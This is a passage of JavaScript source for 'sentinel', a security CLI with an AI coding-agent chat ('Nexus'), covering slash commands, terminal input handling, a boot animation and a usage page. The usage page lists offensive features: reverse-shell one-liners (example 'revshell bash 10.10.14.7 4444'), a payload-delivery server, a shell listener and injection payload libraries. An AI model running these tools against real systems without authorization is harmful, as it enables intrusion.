        const sub = arg, name = argstr.split(/\s+/)[1], body = argstr.split(/\s+/).slice(2).join(" ");
        if (sub === "save" && name && body) { snippets[name] = body; saveSnippets(); transcript.push({ role: "system", text: "saved snippet '" + name + "' — use it with /snippet " + name + " (or /snip)" }); }
        else if ((sub === "del" || sub === "rm") && name) { if (snippets[name]) { delete snippets[name]; saveSnippets(); transcript.push({ role: "system", text: "deleted snippet '" + name + "'" }); } else transcript.push({ role: "system", text: "no snippet '" + name + "'" }); }
        else if (sub && snippets[sub]) { const rest = argstr.split(/\s+/).slice(1).join(" "); submit(snippets[sub].replace(/\$ARGUMENTS/g, rest).replace(/\$(\d+)/g, (_, n) => rest.split(/\s+/)[+n - 1] || "")); }
        else transcript.push({ role: "system", text: "usage:  /snippet save <name> <text…>   ·   /snippet <name> [args]   ·   /snippet del <name>   ·   /snippets to list" }); }
      else if (cmd === "/snippets") { const ks = Object.keys(snippets); transcript.push({ role: "system", text: ks.length ? ("saved snippets:\n" + ks.map((k) => "  " + k + "  " + gray(oneline(snippets[k], 50))).join("\n")) : "no snippets yet — /snippet save <name> <text>" }); }
      else if (cmd === "/explain") { if (arg) submit("Explain, in plain English, what @" + arg + " does and how it works. Do not modify anything."); else { let d = ""; try { d = _cp.execSync("git -c color.ui=never diff HEAD", { cwd, encoding: "utf8" }); } catch (_) {} if (!d.trim()) transcript.push({ role: "system", text: "no uncommitted changes to explain — try /explain <file>" }); else submit("Explain, in plain English, what these uncommitted changes do (do not modify anything):\n\n" + d.slice(0, 8000)); } }
      else if (cmd === "/test") { if (!arg) transcript.push({ role: "system", text: "usage: /test <file> — generate thorough unit tests for it and run them" }); else submit("Write thorough unit tests for @" + arg + ", save them in this project's conventional test location/framework, then run the tests."); }
      else if (cmd === "/tree") { const root = path.resolve(cwd, arg || "."); const out = { lines: [], count: 0 }; const walk = (dir, prefix, depth) => { if (depth > 4 || out.count > 250) return; let ents; try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch (_) { return; } ents = ents.filter((e) => !/^(\.git|node_modules|\.nexus|dist|build|\.cache|\.next|target|__pycache__)$/.test(e.name)).sort((a, b) => (b.isDirectory() - a.isDirectory()) || a.name.localeCompare(b.name)); ents.forEach((e, i) => { if (out.count > 250) return; const last = i === ents.length - 1; out.lines.push(prefix + (last ? "└─ " : "├─ ") + e.name + (e.isDirectory() ? "/" : "")); out.count++; if (e.isDirectory()) walk(path.join(dir, e.name), prefix + (last ? "   " : "│  "), depth + 1); }); }; walk(root, "", 0); transcript.push({ role: "system", text: (arg || ".") + "/\n" + (out.lines.join("\n") || "(empty)") + (out.count > 250 ? "\n… (truncated at 250 entries)" : "") }); }
      else if (cmd === "/theme") {
        if (arg && THEMES[arg]) { applyTheme(arg); const st = readGlobal("state.json", {}) || {}; st.theme = arg; writeGlobal("state.json", st); transcript.push({ role: "system", text: "theme set to " + arg + " — recolored the accent, logo & boot gradient (saved)" }); }
        else { const sw = (t) => THEMES[t].grad.map((g) => "\x1b[" + g + "m█\x1b[0m").join(""); const list = Object.keys(THEMES).map((t) => "  " + (useColor ? sw(t) + "  " : "") + t).join("\n"); transcript.push({ role: "system", text: "themes (use /theme <name>):\n" + list }); }
      }
      else if (cmd === "/offline") { offline = !offline; if (offline && PAID[engine]) { engine = "ollama"; sess.model = "ollama"; sess.ctxWindow = CTXW.ollama || 8192; sess.inTok = 0; sess.outTok = 0; sess.cost = 0; sess.ctxUsed = 0; cont = false; oMsgs.length = 1; transcript.push({ role: "system", text: "offline lock ON — switched to the local engine; cloud engines (claude/opencode) are blocked and nothing leaves this machine" }); } else transcript.push({ role: "system", text: offline ? "offline lock ON — cloud engines blocked; nothing leaves this machine" : "offline lock off — cloud engines allowed again" }); }
      else if (cmd === "/checkpoints") { transcript.push({ role: "system", text: checkpoints.length ? ("checkpoints (newest last):\n" + checkpoints.map((c, i) => "  #" + (i + 1) + "  " + c.label).join("\n") + "\n/undo restores the most recent") : "no checkpoints yet" }); }
      else if (cmd === "/init") { try { const dir = path.join(cwd, ".nexus"); fs.mkdirSync(dir, { recursive: true }); const md = path.join(dir, "NEXUS.md"), cfg = path.join(dir, "config.json"); const made = []; if (!fs.existsSync(md)) { fs.writeFileSync(md, "# Nexus project instructions\n\nNexus loads this file every session.\n\n## Project\n- (describe your project)\n\n## Conventions\n- (style, patterns to follow)\n\n## Build / run / test\n- (commands)\n"); made.push("NEXUS.md"); } if (!fs.existsSync(cfg)) { fs.writeFileSync(cfg, JSON.stringify({ engine, model: "" }, null, 2) + "\n"); made.push("config.json"); } if (gitignoreNexus(cwd)) made.push(".gitignore"); transcript.push({ role: "system", text: made.length ? "initialized .nexus/ (" + made.join(", ") + ") — edit NEXUS.md to give Nexus project context" : ".nexus/ already exists" }); } catch (e) { transcript.push({ role: "system", text: "init failed: " + e.message }); } }
      else if (cmd === "/login") {
        const a0 = (arg || "").trim();
        if (!a0) { const a = nexusAuth(); transcript.push({ role: "system", text: (a ? "signed in as " + (a.name || a.email || a.uid) + "\n" : "") + "paste your code from the website (Settings → Nexus CLI): type  /login <code>\n(advanced: /login google or /login github)" }); }
        else {
          const isProv = ["google", "g", "github", "gh"].includes(a0.toLowerCase());
          const blk = { role: "system", text: isProv ? "/login " + a0 + "…" : "verifying your code…" }; transcript.push(blk); busy = true; scroll = 0; render();
          const log = (s) => { blk.text += "\n" + s; render(); };
          const p = isProv ? nexusLogin(a0.toLowerCase(), log) : nexusLoginCode(a0, log);
          p.then(() => { busy = false; render(); }).catch((e) => { blk.text += "\n" + red(e.message); busy = false; render(); });
        }
      }
      else if (cmd === "/logout") transcript.push({ role: "system", text: nexusLogout() ? "signed out." : "was not signed in." });
      else if (cmd === "/whoami") { const a = nexusAuth(); transcript.push({ role: "system", text: a ? (a.name || a.email || a.uid) + "  (" + String(a.provider).replace(".com", "") + ")" : "not signed in — /login google or /login github" }); }
      else if (cmd === "/setup") { const blk = { role: "system", text: "checking setup…" }; transcript.push(blk); busy = true; scroll = 0; render(); const log = (s) => { blk.text += "\n" + s; render(); }; nexusSetup({ log, auto: true }).then(() => { busy = false; render(); }).catch((e) => { blk.text += "\n" + red(e.message); busy = false; render(); }); }
      else if (cmd === "/model") {
        const eng = ENGINES[engine] || {};
        const setModel = (name) => { sess.model = name; sess.userModel = true; const known = engine === "ollama" || (eng.models || []).includes(name); const note = known ? "" : ((eng.models && eng.models.length) ? gray("  (not in " + engine + "'s known list — using it anyway)") : ""); transcript.push({ role: "system", text: "model set to " + bold(name) + note }); };
        const show = (names, tag) => {
          modelPick = names.slice();
          const cur = sess.model && sess.model !== engine ? sess.model : (eng.model || "engine default");
          const list = names.length ? names.map((n, i) => "  " + gray((i + 1) + ".") + " " + (n === sess.model ? bold(cyan(n)) + cyan("  ← current") : n)).join("\n") : "  " + gray("(no preset list — /model <name> to set one)");
          transcript.push({ role: "system", text: engine + " models" + (tag ? " " + gray(tag) : "") + "  ·  current: " + cyan(cur) + "\n" + list + "\n  " + gray("set with /model <name>  or  /model <number>") }); render();
        };
        const a = (arg || "").trim();
        if (/^\d+$/.test(a)) { if (modelPick[+a - 1]) setModel(modelPick[+a - 1]); else transcript.push({ role: "system", text: "run /model first to see the numbered list, then /model <number>" }); }
        else if (a) setModel(a);
        else if (engine === "ollama") { transcript.push({ role: "system", text: "listing local models…" }); render(); ollamaTags().then((ms) => show(ms, "(installed)")).catch(() => show([], "(Ollama unreachable)")); }
        else show(eng.models || [], (eng.models && eng.models.length) ? "" : "(configured inside the tool)");
      }
      else if (cmd === "/expand") expanded = !expanded;
      else if (cmd === "/engine") {
        if (!arg) transcript.push({ role: "system", text: "engines (● installed):\n" + ENGINE_ORDER.map((e) => "  " + (engineAvail(e) ? green("●") : gray("○")) + " " + e + gray("  " + ENGINES[e].label + (ENGINES[e].paid ? "" : " · free")) + (e === engine ? "  " + cyan("(current)") : "")).join("\n") + "\nswitch with /engine <name>" });
        else if (!ENGINES[arg]) transcript.push({ role: "system", text: "unknown engine '" + arg + "' — options: " + ENGINE_ORDER.join(", ") });
        else if (offline && ENGINES[arg].kind !== "local") transcript.push({ role: "system", text: "offline lock is ON — cloud engines are blocked. Turn it off with /offline first." });
        else if (!engineAvail(arg)) transcript.push({ role: "system", text: "'" + arg + "' (" + ENGINES[arg].label + ") isn't installed — install its CLI, then /engine " + arg });
        else { engine = arg; sess.model = arg; sess.userModel = false; sess.ctxWindow = CTXW[arg] || 200000; sess.inTok = 0; sess.outTok = 0; sess.cost = 0; sess.ctxUsed = 0; warned50 = false; cont = false; oMsgs.length = 1; transcript.push({ role: "system", text: "engine switched to " + arg + " (" + ENGINES[arg].label + ") — cost meter now tracks " + (PAID[arg] ? arg + " (billed)" : arg + " (local · free)") + "; fresh conversation" }); }
      }
      else transcript.push({ role: "system", text: "unknown command '" + cmd + "' — try /help" });
    };
    // ---- input / keys ----
    out.write(ESC + "[?1049h" + ESC + "[?1000h" + ESC + "[?1006h" + ESC + "[?2004h" + ESC + "[?25l" + ESC + "[2J");
    try { process.stdin.setRawMode(true); } catch (_) {}
    process.stdin.resume(); process.stdin.setEncoding("utf8");
    let loading = true;
    // Boot animation control: any key skips it; SENTINEL_FAST / NO_MOTION goes straight to the chat.
    let bootTimer = null, bootDone = false;
    const finishBoot = () => { if (bootDone) return; bootDone = true; if (bootTimer) { clearInterval(bootTimer); bootTimer = null; } loading = false; lastLines = null; out.write(ESC + "[2J"); render(); };
    const fastBoot = !!(process.env.SENTINEL_FAST || process.env.NO_MOTION);
    // auto-connect MCP servers defined in .nexus/mcp.json (non-blocking)
    const connectMcp = async () => { const cfg = loadMcpConfig(cwd); if (!cfg) return; for (const nm of Object.keys(cfg)) { const c = await mcpConnect(nm, cfg[nm], cwd); mcpServers.push(c); if (!loading) render(); } };
    connectMcp();
    process.stdin.on("data", (d) => { try {
      if (loading) { finishBoot(); return; }   // any key skips the intro
      const s = String(d);
      if (s === "\x03") { if (busy && ctl && ctl.kill) { ctl.kill(); transcript.push({ role: "system", text: "interrupting current turn…" }); render(); return; } cleanup(); resolve(); return; } // ctrl+c: stop turn if running, else quit
      if (s === "\x1b[Z") { mode = (mode + 1) % MODES.length; render(); return; } // shift+tab
      if (s === "\x0f") { expanded = !expanded; render(); return; }      // ctrl+o
      // ---- scrollback (works during a turn too) ----
      const page = Math.max(1, rows() - 6);
      if (s === "\x1b[5~") { scroll += page; render(); return; }         // PageUp
      if (s === "\x1b[6~") { scroll = Math.max(0, scroll - page); render(); return; } // PageDown
      if (s === "\x1b[F" || s === "\x1b[4~" || s === "\x1bOF") { scroll = 0; render(); return; } // End -> latest
      if (s === "\x1b[1~" || s === "\x1bOH" || s === "\x1b[H") { scroll += 100000; render(); return; } // Home -> top (clamped in render)
      if (s.charCodeAt(0) === 27 && s[1] === "[" && s[2] === "<") { const m = /\[<(\d+);\d+;\d+[Mm]/.exec(s); if (m) { const btn = +m[1]; if (btn === 64) { scroll += 3; render(); } else if (btn === 65) { scroll = Math.max(0, scroll - 3); render(); } } return; } // SGR mouse wheel
      if (busy) return;                                                  // ignore typing mid-turn (scroll/interrupt/mode still work above)
      // ---- bracketed paste (handles multi-line pastes, possibly split across chunks) ----
      if (pasteBuf !== null || s.indexOf("\x1b[200~") !== -1) {
        let chunk = s;
        if (pasteBuf === null) { pasteBuf = ""; chunk = chunk.slice(chunk.indexOf("\x1b[200~") + 6); }
        const end = chunk.indexOf("\x1b[201~");
        if (end === -1) { pasteBuf += chunk; return; }                   // more paste coming in a later chunk
        pasteBuf += chunk.slice(0, end);
        input += pasteBuf.replace(/\r\n?|\n/g, " ").replace(/[^\x20-\x7e]+/g, "");
        pasteBuf = null; render(); return;
      }
      if (s === "\x1b[A") { if (history.length) { hIdx = Math.max(0, hIdx - 1); input = history[hIdx] || ""; render(); } return; } // up
      if (s === "\x1b[B") { if (history.length) { hIdx = Math.min(history.length, hIdx + 1); input = history[hIdx] || ""; render(); } return; } // down
      if (s.charCodeAt(0) === 27) return;                                // other escapes
      for (const ch of s) {
        if (ch === "\t") { // Tab completes a slash command, else an @file path
          const mm = slashMatches(); if (mm.length) { input = mm[0][0] + " "; render(); return; }
          const at = input.match(/@([^\s]*)$/);
          if (at) { try { const pt = at[1]; const dir = pt.includes("/") ? pt.slice(0, pt.lastIndexOf("/") + 1) : ""; const bpart = pt.includes("/") ? pt.slice(pt.lastIndexOf("/") + 1) : pt; const entries = fs.readdirSync(path.resolve(cwd, dir || ".")).filter((e) => e.startsWith(bpart)).sort(); if (entries.length) { const hit = entries[0]; const isDir = fs.statSync(path.resolve(cwd, dir + hit)).isDirectory(); input = input.slice(0, at.index) + "@" + dir + hit + (isDir ? "/" : " "); } } catch (_) {} render(); }
          return;
        }
        if (ch === "\r" || ch === "\n") {
          if (input.endsWith("\\")) { input = input.slice(0, -1) + "\n"; render(); return; } // trailing backslash = newline, not submit
          const t = input.trim(); input = ""; if (/^\/(exit|quit|q)$/i.test(t)) { cleanup(); resolve(); return; } if (t.startsWith("/")) { let cmd = t; if (!/\s/.test(t)) { const mm = fuzzyCmds(t); if (mm.length && !mm.some((c) => c[0] === t.toLowerCase())) cmd = mm[0][0]; } handleSlash(cmd); render(); return; } if (t[0] === "!" && t.length > 1) { runBang(t.slice(1).trim()); render(); return; } if (t[0] === "#" && t.length > 1) { addMemory(t.slice(1).trim()); render(); return; } if (t) { submit(t); return; } render(); }
        else if (ch === "\x7f" || ch === "\b") { input = input.slice(0, -1); render(); }
        else if (ch >= " ") { input += ch; render(); }
      }
    } catch (err) { busy = false; try { transcript.push({ role: "system", text: "internal error: " + (err && err.message || err) }); render(); } catch (_) {} } });
    out.on("resize", onResize);
    // ---- boot loading animation ----
    (function boot() {
      if (fastBoot) return finishBoot();   // instant start when asked
      const caps = [["claude", hasBin("claude")], ["ollama", false], ["opencode", hasBin("opencode")], ["git", fs.existsSync(path.join(cwd, ".git"))], ["index", fs.existsSync(path.join(cwd, ".nexus", "index.json"))], ["memory", fs.existsSync(path.join(cwd, ".nexus", "NEXUS.md"))]];
      let localModels = -1; try { ollamaTags().then((m) => { localModels = m.length; }).catch(() => { localModels = 0; }); } catch (_) { localModels = 0; }
      const taglines = ["multi-engine · Claude + local + OpenCode", "race cloud vs local — /race", "save tokens — /cowork /lean /effort", "git-native — /undo /diff /commit", "secure by default — /guard /redact", "private local RAG — /index", "50+ commands — just type /", "press any key to skip"];
      const artW = ART[0].length;
      const gart = (s, i, off) => useColor ? "\x1b[1;" + GRAD[(i + off) % GRAD.length] + "m" + s + "\x1b[0m" : s;
      const stars = []; for (let k = 0; k < 16; k++) stars.push({ x: 1 + (Math.random() * (cols() - 2) | 0), y: 1 + (Math.random() * (rows() - 2) | 0), ph: (Math.random() * 6) | 0 });
      let f = 0; const total = 12;   // was 22 — ~half the frames, snappier start
      bootTimer = setInterval(() => {
        const C = cols(), R = rows(), cx = (C / 2) | 0, cy = (R / 2) | 0, top = Math.max(1, cy - 6);
        caps[1][1] = localModels > 0;
        const put = (row, str, vis) => ESC + "[" + row + ";" + Math.max(1, cx - (((vis || str.length) / 2) | 0)) + "H" + str;
        let b = ESC + "[2J";
        for (const s of stars) { const tw = (f + s.ph) % 6; const ch = tw < 2 ? "·" : tw < 4 ? "+" : "*"; b += ESC + "[" + s.y + ";" + s.x + "H" + (tw < 2 ? gray(ch) : tw < 4 ? dim(cyan(ch)) : cyan(ch)); } // twinkling starfield behind the logo
        for (let i = 0; i < ART.length; i++) b += ESC + "[" + (top + i) + ";" + Math.max(1, cx - (artW / 2 | 0)) + "H" + gart(ART[i], i, f); // shimmer wave down the logo
        b += put(top + ART.length + 1, dim(gray("the multi-engine AI coding agent")), 32);
        const nShown = Math.min(caps.length, ((f / total) * caps.length | 0) + 1);
        let cap = ""; for (let i = 0; i < nShown; i++) { const [nm, okc] = caps[i]; cap += (okc ? green("●") : gray("○")) + " " + (okc ? nm : gray(nm)) + (nm === "ollama" && localModels > 0 ? gray("(" + localModels + ")") : "") + "   "; }
        b += put(top + ART.length + 3, cap, stripA(cap).length);
        const bar = Math.round((f / total) * 26);
        b += put(top + ART.length + 5, gray("[") + cyan("▓".repeat(bar)) + gray("░".repeat(26 - bar)) + gray("]"), 28);
        const tl = taglines[(f / 3 | 0) % taglines.length];
        b += put(top + ART.length + 7, cyan(tl), tl.length);
        out.write(b);
        if (++f > total) { clearInterval(bootTimer); bootTimer = null;
          // power-on flash: one bright frame of the logo, then hand off to the chat
          const cx2 = (cols() / 2) | 0, cy2 = (rows() / 2) | 0, top2 = Math.max(1, cy2 - 6);
          let fl = ESC + "[2J"; for (let i = 0; i < ART.length; i++) fl += ESC + "[" + (top2 + i) + ";" + Math.max(1, cx2 - (artW / 2 | 0)) + "H" + (useColor ? "\x1b[1;97m" + ART[i] + "\x1b[0m" : ART[i]);
          out.write(fl);
          setTimeout(finishBoot, 80);
        }
      }, 45);
    })();
  });
}
// add `.nexus/` to .gitignore (Nexus's state dir shouldn't clutter git); returns true if it added it
function gitignoreNexus(cwd) {
  try {
    const fs = require("fs"), path = require("path");
    if (!fs.existsSync(path.join(cwd, ".git"))) return false;
    const gi = path.join(cwd, ".gitignore");
    let cur = ""; try { cur = fs.readFileSync(gi, "utf8"); } catch (_) {}
    if (/(^|\n)\.nexus\/?(\r?\n|$)/.test(cur)) return false;
    fs.writeFileSync(gi, cur + (cur && !cur.endsWith("\n") ? "\n" : "") + ".nexus/\n");
    return true;
  } catch (_) { return false; }
}
function nexusInit() {
  const fs = require("fs"), path = require("path");
  const cwd = process.cwd(), NEXUS = path.join(cwd, ".nexus");
  gitignoreNexus(cwd);
  fs.mkdirSync(NEXUS, { recursive: true });
  const mdPath = path.join(NEXUS, "NEXUS.md"), cfgPath = path.join(NEXUS, "config.json");
  const detected = [];
  try { if (fs.existsSync("package.json")) { const p = JSON.parse(fs.readFileSync("package.json", "utf8")); detected.push("Node project" + (p.name ? " (" + p.name + ")" : "")); if (p.scripts) detected.push("npm scripts: " + Object.keys(p.scripts).slice(0, 8).join(", ")); } } catch (_) {}
  try { if (fs.existsSync("requirements.txt") || fs.existsSync("pyproject.toml") || fs.existsSync("setup.py")) detected.push("Python project"); } catch (_) {}
  try { if (fs.existsSync("Cargo.toml")) detected.push("Rust project"); } catch (_) {}
  try { if (fs.existsSync("go.mod")) detected.push("Go project"); } catch (_) {}
  try { if (fs.existsSync(".git")) detected.push("git repository"); } catch (_) {}
  let created = [];
  if (!fs.existsSync(mdPath)) { fs.writeFileSync(mdPath, "# Nexus project instructions\n\nNexus loads this file at the start of every session. Describe the project, conventions, and how to build/run/test it so the agent has context.\n\n## Project\n" + (detected.length ? detected.map((d) => "- " + d).join("\n") : "- (describe your project here)") + "\n\n## Conventions\n- (code style, patterns to follow, things to avoid)\n\n## Build / run / test\n- (commands to build, run, and test)\n"); created.push("NEXUS.md"); }
  if (!fs.existsSync(cfgPath)) { fs.writeFileSync(cfgPath, JSON.stringify({ engine: hasBin("claude") ? "claude" : "ollama", model: process.env.SENTINEL_MODEL || "" }, null, 2) + "\n"); created.push("config.json"); }
  banner(); h1("Nexus initialized");
  created.forEach((f) => console.log("  " + green("created ") + ".nexus/" + f));
  if (!created.length) console.log("  " + gray("already initialized (.nexus/ exists)"));
  if (detected.length) console.log("\n  " + gray("detected: ") + detected.join(gray(" · ")));
  console.log("\n  " + bold("Next steps"));
  console.log("    " + cyan("sentinel nexus") + gray("                 start a chat session"));
  console.log("    " + cyan("sentinel nexus run \"<goal>\"") + gray("     autonomous multi-step run"));
  console.log("    " + gray("edit ") + ".nexus/NEXUS.md" + gray(" to give the agent project context") + "\n");
}
function usage() {
  banner();
  console.log(`  ${bold("USAGE")}
    sentinel [command] [args]         no command opens the interactive menu

  ${bold("COMMANDS")}
    ${cyan("AI & Nexus")}
    nexus [opts] [task]               Nexus AI coder chat: -e claude|gemini|codex|opencode|aider|ollama, -y skip prompts, --print headless
    nexus run "<goal>" [opts]         autonomous multi-level runner: -e engine, --overnight, --until, --resume
    init                              scaffold Nexus in this project (.nexus/NEXUS.md + config)
    docs [topic]                      built-in Nexus documentation (docs all for everything)

    ${cyan("Setup & security")}
    doctor                            health check: engines, Ollama, policy, audit chain
    policy [init|--json]              show/scaffold the security policy (init writes a starter .nexus/policy.json)
    audit [verify|--json]             show the audit trail; 'verify' checks the hash chain (exit 1 if tampered)
    login [google|github|<code>]      sign in (paste your code from the website Settings)
    setup <tool>                      auto-configure a tool on first use

    ${cyan("Recon")}
    scan <host> [ports]               TCP scan (ports: top | 1-1024 | 80,443)
    dns <domain>                      A / AAAA / MX / NS / TXT / CNAME + reverse
    whois <domain|ip>                 native WHOIS lookup
    headers <url>                     HTTP status + security-header check
    cert <host>                       TLS certificate inspector
    subs <domain>                     passive subdomain enum (crt.sh)
    cve <keyword | CVE-id>            search the NVD vulnerability database
    fuzz <url> [wordlist]             directory / content brute-forcer

    ${cyan("Offensive")}
    revshell <lang> <ip> <port>       reverse-shell one-liner
    serve [port] [dir]                HTTP file server for payload delivery (default 8000)
    listen [port]                     TCP listener to catch a reverse shell (default 4444)
    payloads [class]                  payload library (sqli, xss, lfi, cmdi, ssti, ssrf)
    lab [target]                      practice targets (dvwa, juice, webgoat, bwapp, mutillidae)

    ${cyan("Encoding & hashing")}
    encode <b64|hex|url|base32> <text>  encode text
    decode <b64|hex|url|base32> <text>  decode text
    hash <text>                       md5 / sha1 / sha256 / sha512
    hashfile <file>                   md5 / sha1 / sha256 / sha512 of a file
    hashid <hash>                     identify a hash type
    genpass [length]                  generate a strong random password (default 20)
    defang <ioc>                      neutralize a URL/IP/email for safe pasting (hxxp, [.])
    refang <text>                     reverse defang

    ${cyan("Network & analysis")}
    entropy <string>                  Shannon entropy — flag high-entropy secrets/keys
    epoch [ts|date]                   unix timestamp <-> ISO/UTC (no arg = now)
    incidr <ip> <cidr>                is an IP inside a CIDR range? (firewall/allowlist checks)
    port <number|service>             port <-> service lookup (both directions)
    url <url>                         break a URL into scheme/host/port/path/query/fragment
    totp <base32-secret>              generate a 2FA (TOTP) code from a secret
    useragent <ua-string>             parse a User-Agent (browser / OS / device / bot)
    cidr <a.b.c.d/xx>                 subnet calculator (range, hosts, mask)
    jwt <token>                       decode a JWT header + payload
    dorks <domain>                    print Google dork search URLs for a domain
    uuid                              generate a random UUID v4
    myip                              show your public IP address
    ipinfo <ip>                       geolocate an IP (city, ISP, ASN)
    status <code>                     look up an HTTP status code

    ${cyan("Git")}
    git clone <url>                   clone a repo (SENTINEL_GH_TOKEN for private)
    git push [message]                commit all changes + push
    git pull                          pull the latest changes
    git status                        working-tree status
    git log                           recent commits
    git diff [file]                   working-tree diff
    git branch                        list branches
    git checkout <branch>             switch branch
    git repos                         list your repositories
    git new <name>                    create a private repo
    git issues <owner/repo>           list open issues
    git prs <owner/repo>              list open pull requests
    git issue <owner/repo> "title"    create an issue
    git pr "title" [base]             open a PR from the current branch
    git comment <owner/repo> <n> "…"  comment on an issue/PR
    git gists                         list your gists
    git gist <file> [description]     create a gist from a file

    ${cyan("Reference")}
    cheats [topic]                    ${Object.keys(CHEATS).join(", ")}
    tools                             tool catalog + install commands

  ${bold("OPTIONS")}
    -h, --help                        show this help
    -v, --version                     show version
    NO_COLOR=1                        disable colored output

  ${bold("EXAMPLES")}
    ${gray("$")} sentinel scan 10.10.14.7 top
    ${gray("$")} sentinel revshell bash 10.10.14.7 4444
    ${gray("$")} sentinel hash 'S3cr3t!'

  ${gray("MIT licensed · use only on systems you are authorized to test.")}
`);
}

// ---------- entry ----------
process.on("SIGINT", () => { if (tuiActive) return; console.log("\n  " + gray("interrupted — stay sharp.") + "\n"); process.exit(130); });
const args = process.argv.slice(2);
if (args[0] === "-v" || args[0] === "--version") {
  console.log("sentinel " + VERSION); // first line stays machine-parseable
  if (!args.includes("--short")) {
    console.log(gray("  node " + process.version + " · " + process.platform + "/" + process.arch));
    const inst = ENGINE_ORDER.filter((e) => e !== "ollama" && engineAvail(e));
    if (engineAvail("ollama")) inst.push("ollama (local)");
    console.log(gray("  AI engines: " + (inst.length ? inst.join(", ") : "none installed")));
  }
  process.exit(0);
}
else if (args.length === 0) mainMenu();
else if (args[0] === "-h" || args[0] === "--help") usage();
else cli(args).then(() => process.exit(0)).catch((e) => { console.error("  " + red("error: " + e.message)); process.exit(1); });
